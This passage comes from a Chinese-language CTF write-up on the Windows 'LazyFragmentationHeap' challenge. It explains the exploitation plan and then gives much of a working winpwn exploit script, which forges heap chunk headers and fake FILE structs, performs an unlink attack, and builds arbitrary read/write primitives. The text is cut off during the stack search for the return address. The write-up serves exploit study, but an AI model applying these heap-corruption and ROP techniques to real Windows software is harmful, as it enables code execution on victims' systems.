 因此只要不断调用以上的primitive，就可以实现任意次数的任意地址读和写。</li>
<li>但是存在的问题是，<code>p64(0xDDAABEEF1ACD)</code>中存在”\x1A”字符，在windows中，这个字符备用表示字符串流的结尾，因此如果输入中存在这个字符，那么它后面的字符都不会被接受，那我们上面构造的primitive就用不了了。<br> 然而注意到，我们做leak和做最后利用的时候是分开的，也就是说read file的功能还只用了一次，于是我们可以同上面提到的任意地址读（或写）一次，将<code>ucrtbase!_pioinfo[0] + 0x38</code>上1 byte的flag标志置为<code>0x09</code>，这样可以把输入流模式从字符流改为二进制流，这样任意字符都可以读入了。<br> 需要注意的是<code>ucrtbase!_pioinfo[0] + 0x38</code>是个堆地址，所以其偏移是相对稳定的（有时会稍微变化），再加上堆地址我们早就得到了，所以完全可以预测到它的位置。</li>
<li>那么承接使用上面的primitive，我们可以：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kernel32.ll -&gt; ntdll.dll -&gt; ntdll!PebLdr - <span class="number">0x78</span> --&gt; PEB --&gt; TEB --&gt; stack_end</span><br></pre></td></tr></table></figure>
完成一条leak链，然后从stack搜索返回地址。</li>
<li>注意到<code>main</code>函数是不会返回的，只会直接<code>exit</code>，所以这里采用劫持<code>_read</code>函数的返回地址的方法。<br>这是因为我们最后写ROP的时候，一定是通过<code>edit</code>功能写的，而归根到底是通过<code>_read</code>写的，那么覆盖<code>_read</code>的返回地址就可以在返回的时候劫持到程序控制流了。<br>至于怎么定位<code>_read</code>返回地址的位置，由于我们是通过<code>show</code>功能进行leak的，最终也是通过调用<code>printf</code>打印的，而<code>printf</code>和<code>_read</code>使用的栈帧是同样的，即返回地址存放在栈上的地址是一致的。<br>故我们只要以<code>printf</code>的返回地址作为标志，搜索栈内存空间，即可同样定位到<code>_read</code>的返回地址所在的位置。</li>
<li>此外有一个需要注意的点是，虽然AngelBoy的Slides中提到了Child Process Policy，在Ex师傅的博客地下的评论中也有”新版的Windows API新增 PROCESS_MITIGATION_CHILD_PROCESS_POLICY 的功能”这样一句话，但是实际在本地调试中并没有感受到它的存在，虽然最后写<code>system</code>的ROP时候并没有getshell，但其原因貌似在于LFH userblock corruption了，至于实际情况还有待考证。</li>
<li>因此这里采用Slides中的做法，也是最稳健的做法，即通过任意地址写在<code>.data</code>段上写入一段orw的shellcode，然后ROP调用<code>VirtualProtect</code>修改<code>.data</code>段的权限为RWX，最后跳转到shellcode执行即可。</li>
</ol>
<h2 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote("node3.buuoj.cn", 26659)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Attack</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.menu = &#123;</span><br><span class="line">            <span class="string">"create"</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">"edit"</span>: <span class="number">2</span>,</span><br><span class="line">            <span class="string">"show"</span>: <span class="number">3</span>,</span><br><span class="line">            <span class="string">"delete"</span>: <span class="number">4</span>,</span><br><span class="line">            <span class="string">"file"</span>: <span class="number">5</span>,</span><br><span class="line">            <span class="string">"exit"</span>: <span class="number">6</span>,</span><br><span class="line">            <span class="string">"open"</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">"read"</span>: <span class="number">2</span>,</span><br><span class="line">            <span class="string">"back"</span>: <span class="number">3</span></span><br><span class="line">        &#125;</span><br><span class="line">        self.array_addr = <span class="number">0xBEEFDAD0000</span></span><br><span class="line"></span><br><span class="line">        self.p = <span class="literal">None</span></span><br><span class="line">        self.encoding = <span class="literal">None</span></span><br><span class="line">        self.heap_addr = <span class="literal">None</span></span><br><span class="line">        self.text_base = <span class="literal">None</span></span><br><span class="line">        self.ucrtbase = <span class="literal">None</span></span><br><span class="line">        self.pioinfo_offset = <span class="literal">None</span></span><br><span class="line">        self.kernel32 = <span class="literal">None</span></span><br><span class="line">        self.ntdll = <span class="literal">None</span></span><br><span class="line">        self.PEB = <span class="literal">None</span></span><br><span class="line">        self.TEB = <span class="literal">None</span></span><br><span class="line">        self.stack_end = <span class="literal">None</span></span><br><span class="line">        self.ret_address_in_stack = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.do_simple_leak()</span><br><span class="line">                self.do_attack()</span><br><span class="line">                <span class="comment"># self.debug()</span></span><br><span class="line">                self.show_info()</span><br><span class="line">                self.p.interactive()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> AssertionError <span class="keyword">as</span> e:</span><br><span class="line">                self.p.close()</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">                self.p.close()</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                self.p.close()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">'1'</span>:</span><br><span class="line">            windbgx.attach(self.p)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">choose_func</span><span class="params">(self, choice)</span>:</span></span><br><span class="line">        self.p.sendlineafter(<span class="string">"Your choice: "</span>, str(self.menu[choice]), timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(self, size, idx)</span>:</span></span><br><span class="line">        self.choose_func(<span class="string">"create"</span>)</span><br><span class="line">        self.p.sendlineafter(<span class="string">"Size:"</span>, str(size))</span><br><span class="line">        self.p.sendlineafter(<span class="string">"ID"</span>, str(idx))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(self, idx, content)</span>:</span></span><br><span class="line">        self.choose_func(<span class="string">"edit"</span>)</span><br><span class="line">        self.p.sendlineafter(<span class="string">"ID"</span>, str(idx), timeout=<span class="number">1</span>)</span><br><span class="line">        self.p.sendafter(<span class="string">"Content:"</span>, content)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(self, idx)</span>:</span></span><br><span class="line">        self.choose_func(<span class="string">"show"</span>)</span><br><span class="line">        self.p.sendlineafter(<span class="string">"ID"</span>, str(idx))</span><br><span class="line">        self.p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(self, idx)</span>:</span></span><br><span class="line">        self.choose_func(<span class="string">"delete"</span>)</span><br><span class="line">        self.p.sendlineafter(<span class="string">"ID"</span>, str(idx), timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open_file</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.choose_func(<span class="string">"file"</span>)</span><br><span class="line">        self.choose_func(<span class="string">"open"</span>)</span><br><span class="line">        self.choose_func(<span class="string">"back"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_file</span><span class="params">(self, idx, size, content=None)</span>:</span></span><br><span class="line">        self.choose_func(<span class="string">"file"</span>)</span><br><span class="line">        self.choose_func(<span class="string">"read"</span>)</span><br><span class="line">        self.p.sendlineafter(<span class="string">"ID"</span>, str(idx))</span><br><span class="line">        self.p.sendlineafter(<span class="string">"Size:"</span>, str(size))</span><br><span class="line">        <span class="keyword">if</span> content:</span><br><span class="line">            self.p.send(content)</span><br><span class="line">        self.choose_func(<span class="string">"back"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.choose_func(<span class="string">"exit"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ctor_heap_head</span><span class="params">(self, size, flags, prev_size, remain_size)</span>:</span></span><br><span class="line">        chksum =  ((size &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xff</span>) ^ ((size &gt;&gt; <span class="number">4</span>) &gt;&gt; <span class="number">8</span>) ^ flags</span><br><span class="line">        val = (size &gt;&gt; <span class="number">4</span>) | (flags &lt;&lt; <span class="number">16</span>) | (chksum &lt;&lt; <span class="number">24</span>) | (prev_size &gt;&gt; <span class="number">4</span> &lt;&lt; <span class="number">32</span>) | (remain_size &lt;&lt; <span class="number">56</span>)</span><br><span class="line">        <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ctor_fake_file</span><span class="params">(self, buf, fileno)</span>:</span></span><br><span class="line">        fake_file = <span class="string">""</span></span><br><span class="line">        fake_file += p64(<span class="number">0</span>) + p64(buf) <span class="comment"># buffer</span></span><br><span class="line">        fake_file += p32(<span class="number">0</span>) + p32(<span class="number">0x2080</span>)</span><br><span class="line">        fake_file += p64(fileno) <span class="comment"># fileno = 0</span></span><br><span class="line">        fake_file += p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>)</span><br><span class="line">        fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>)</span><br><span class="line">        fake_file += p64(<span class="number">0xFFFFFFFF</span>)</span><br><span class="line">        fake_file += p64(<span class="number">0x0</span>) * <span class="number">2</span></span><br><span class="line">        fake_file += p64(<span class="number">0x0</span>)</span><br><span class="line">        fake_file += p64(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> fake_file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prepare</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.create(<span class="number">0x3F8</span>, <span class="number">1</span>)</span><br><span class="line">        self.create(<span class="number">0x408</span>, <span class="number">2</span>)</span><br><span class="line">        self.create(<span class="number">0x4E8</span>, <span class="number">3</span>)</span><br><span class="line">        self.create(<span class="number">0x378</span>, <span class="number">4</span>) </span><br><span class="line">        self.create(<span class="number">0x378</span>, <span class="number">5</span>) <span class="comment"># --&gt; victim</span></span><br><span class="line">        self.create(<span class="number">0x3F8</span>, <span class="number">6</span>) <span class="comment"># gap</span></span><br><span class="line">        self.create(<span class="number">0x378</span>, <span class="number">7</span>) <span class="comment"># --&gt; to be freed</span></span><br><span class="line">        self.create(<span class="number">0x378</span>, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># leak encoding</span></span><br><span class="line">        self.open_file()</span><br><span class="line">        self.read_file(<span class="number">1</span>, <span class="number">0x3F8</span>)</span><br><span class="line">        self.show(<span class="number">1</span>)</span><br><span class="line">        self.p.recvuntil(<span class="string">", use th"</span>)</span><br><span class="line">        encode_head = u64(self.p.recv(<span class="number">6</span>) + <span class="string">"\x00\x08"</span>)</span><br><span class="line">        self.encoding = self.ctor_heap_head(<span class="number">0x410</span>, <span class="number">0x1</span>, <span class="number">0x400</span>, <span class="number">0x8</span>) ^ encode_head</span><br><span class="line"></span><br><span class="line">        <span class="comment"># overwrite chunk 2's head</span></span><br><span class="line">        fake_head = self.ctor_heap_head(<span class="number">0x1000</span>, <span class="number">0x1</span>, <span class="number">0x400</span>, <span class="number">0x8</span>) ^ self.encoding</span><br><span class="line">        self.edit(<span class="number">1</span>, <span class="string">"A"</span> * <span class="number">0x3F8</span> + p64(fake_head)[:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment"># chunk overlap</span></span><br><span class="line">        self.delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># use LFH, which is just at chunk 3's space</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">            self.open_file()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># leak heap address</span></span><br><span class="line">        self.show(<span class="number">3</span>)</span><br><span class="line">        self.heap_addr = u64(self.p.recvline()[:<span class="number">-2</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">        <span class="keyword">assert</span>(self.heap_addr != <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># hijack FILE struct</span></span><br><span class="line">        payload = <span class="string">"\x00"</span> * <span class="number">0x50</span> <span class="comment"># padding</span></span><br><span class="line">        payload += self.ctor_fake_file(self.array_addr + <span class="number">0x28</span> * <span class="number">5</span> + <span class="number">0x20</span>, <span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">        self.edit(<span class="number">3</span>, payload)</span><br><span class="line">        payload = <span class="string">"\x00"</span> * <span class="number">0x40</span> <span class="comment"># padding</span></span><br><span class="line">        payload += self.ctor_fake_file(self.array_addr + <span class="number">0x28</span> * <span class="number">5</span> + <span class="number">0x20</span>, <span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">        self.edit(<span class="number">4</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">leak_text_base</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># use fread to arbitrary write and read</span></span><br><span class="line">        target_addr = self.heap_addr + <span class="number">0xCFB2</span> - <span class="number">0xCB50</span> <span class="comment"># skip \x00\x00</span></span><br><span class="line">        self.read_file(<span class="number">8</span>, <span class="number">0x8</span>, p64(target_addr))</span><br><span class="line">        self.show(<span class="number">6</span>)</span><br><span class="line">        self.text_base = u64(self.p.recvline()[:<span class="number">-2</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) &lt;&lt; <span class="number">16</span></span><br><span class="line">        <span class="keyword">assert</span>(self.text_base &gt;&gt; <span class="number">24</span> != <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">leak_ucrtbase</span><span class="params">(self)</span>:</span></span><br><span class="line">        target_addr = self.text_base + <span class="number">0x30A0</span> <span class="comment"># atoll_iat</span></span><br><span class="line">        self.read_file(<span class="number">8</span>, <span class="number">0x8</span>, p64(target_addr))</span><br><span class="line">        self.show(<span class="number">6</span>)</span><br><span class="line">        self.ucrtbase = u64(self.p.recvline()[:<span class="number">-2</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - <span class="number">0x67A30</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">leak_pioinfo</span><span class="params">(self)</span>:</span></span><br><span class="line">        target_addr = self.ucrtbase + <span class="number">0xF0980</span> <span class="comment"># ucrtbase!_pioinfo[0]</span></span><br><span class="line">        self.read_file(<span class="number">8</span>, <span class="number">0x8</span>, p64(target_addr))</span><br><span class="line">        self.show(<span class="number">6</span>)</span><br><span class="line">        self.pioinfo_offset = u64(self.p.recvline()[:<span class="number">-2</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) &amp; <span class="number">0xFFFF</span></span><br><span class="line">        <span class="keyword">assert</span>(self.pioinfo_offset != <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_simple_leak</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.p = process(<span class="string">"./LazyFragmentationHeap.exe"</span>)</span><br><span class="line">        self.prepare()</span><br><span class="line">        self.leak_text_base()</span><br><span class="line">        self.p.close()</span><br><span class="line"></span><br><span class="line">        self.p = process(<span class="string">"./LazyFragmentationHeap.exe"</span>)</span><br><span class="line">        self.prepare()</span><br><span class="line">        self.leak_ucrtbase()</span><br><span class="line">        self.p.close()</span><br><span class="line"></span><br><span class="line">        self.p = process(<span class="string">"./LazyFragmentationHeap.exe"</span>)</span><br><span class="line">        self.prepare()</span><br><span class="line">        self.leak_pioinfo()</span><br><span class="line">        self.p.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write_pioinfo</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.prepare()</span><br><span class="line">        pioinfo = (self.heap_addr &gt;&gt; <span class="number">16</span> &lt;&lt; <span class="number">16</span>) | self.pioinfo_offset</span><br><span class="line">        self.read_file(<span class="number">6</span>, <span class="number">8</span>, p64(pioinfo + <span class="number">0x38</span>))</span><br><span class="line">        self.edit(<span class="number">6</span>, <span class="string">"\x09"</span>) <span class="comment"># change to binary mode</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unlink_attack</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.create(<span class="number">0x3C8</span>, <span class="number">2</span>)</span><br><span class="line">        payload = <span class="string">"\x00"</span> * <span class="number">0x58</span> <span class="comment"># padding</span></span><br><span class="line">        payload += p64(self.ctor_heap_head(<span class="number">0x380</span>, <span class="number">0x0</span>, <span class="number">0x380</span>, <span class="number">0x0</span>) ^ self.encoding) <span class="comment"># fake victim chunk head (freed status)</span></span><br><span class="line">        payload += p64(self.array_addr + <span class="number">0x28</span> * <span class="number">4</span> + <span class="number">0x20</span> - <span class="number">0x8</span>) + p64(self.array_addr + <span class="number">0x28</span> * <span class="number">4</span> + <span class="number">0x20</span>)</span><br><span class="line">        self.edit(<span class="number">2</span>, payload)</span><br><span class="line">        self.delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">arbitrary_write</span><span class="params">(self, addr, content, final_write=False)</span>:</span></span><br><span class="line">        <span class="comment"># | edit_status | buffer |</span></span><br><span class="line">        payload = p64(<span class="number">0xDDAABEEF1ACD</span>) + p64(self.array_addr + <span class="number">0x28</span> * <span class="number">5</span> + <span class="number">0x18</span>) </span><br><span class="line">        <span class="comment"># | exist_status | size | id | edit_status | buffer |</span></span><br><span class="line">        payload += p64(<span class="number">0xDDAABEEF1ACD</span>) + p64(<span class="number">0x378</span>) + p64(<span class="number">7</span>) + p64(<span class="number">0xDDAABEEF1ACD</span>) + p64(addr)</span><br><span class="line">        <span class="comment"># | exist_status | size | id | edit_status | buffer |</span></span><br><span class="line">        payload += p64(<span class="number">0xDDAABEEF1ACD</span>) + p64(<span class="number">0x378</span>) + p64(<span class="number">8</span>) + p64(<span class="number">0xDDAABEEF1ACD</span>) + p64(self.array_addr + <span class="number">0x28</span> * <span class="number">5</span> + <span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">        self.edit(<span class="number">6</span>, payload)</span><br><span class="line">        self.edit(<span class="number">7</span>, content)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> final_write == <span class="literal">False</span>:</span><br><span class="line">            <span class="comment"># | edit_status | buffer |</span></span><br><span class="line">            payload = p64(<span class="number">0xDDAABEEF1ACD</span>) + p64(self.array_addr + <span class="number">0x28</span> * <span class="number">5</span> + <span class="number">0x18</span>) </span><br><span class="line">            self.edit(<span class="number">8</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">arbitrary_read</span><span class="params">(self, addr)</span>:</span></span><br><span class="line">        <span class="comment"># | edit_status | buffer |</span></span><br><span class="line">        payload = p64(<span class="number">0xDDAABEEF1ACD</span>) + p64(self.array_addr + <span class="number">0x28</span> * <span class="number">5</span> + <span class="number">0x18</span>) </span><br><span class="line">        <span class="comment"># | exist_status | size | id | edit_status | buffer |</span></span><br><span class="line">        payload += p64(<span class="number">0xDDAABEEF1ACD</span>) + p64(<span class="number">0x378</span>) + p64(<span class="number">7</span>) + p64(<span class="number">0xDDAABEEF1ACD</span>) + p64(addr)</span><br><span class="line">        <span class="comment"># | exist_status | size | id | edit_status | buffer |</span></span><br><span class="line">        payload += p64(<span class="number">0xDDAABEEF1ACD</span>) + p64(<span class="number">0x378</span>) + p64(<span class="number">8</span>) + p64(<span class="number">0xDDAABEEF1ACD</span>) + p64(self.array_addr + <span class="number">0x28</span> * <span class="number">5</span> + <span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">        self.edit(<span class="number">6</span>, payload)</span><br><span class="line">        self.show(<span class="number">7</span>)</span><br><span class="line">        value = u64(self.p.recvline()[:<span class="number">-2</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># | edit_status | buffer |</span></span><br><span class="line">        payload = p64(<span class="number">0xDDAABEEF1ACD</span>) + p64(self.array_addr + <span class="number">0x28</span> * <span class="number">5</span> + <span class="number">0x18</span>) </span><br><span class="line">        self.edit(<span class="number">8</span>, payload)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">search_ret_addr</span><span class="params">(self)</span>:</span></span><br><span class="line">        address = self.stack_end - <span class="number">0x8</span></span><br><span class="line">        <span class="keyword">for</span> offset <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">0x1000</span>, <span class="number">8</span>):</span><br><span class="line">            val = self.arbitrary_read(address) </span><br><span class="line">            <span class="keyword">if</span> val == self.text_base + <span class="number">0x17C4</span>: 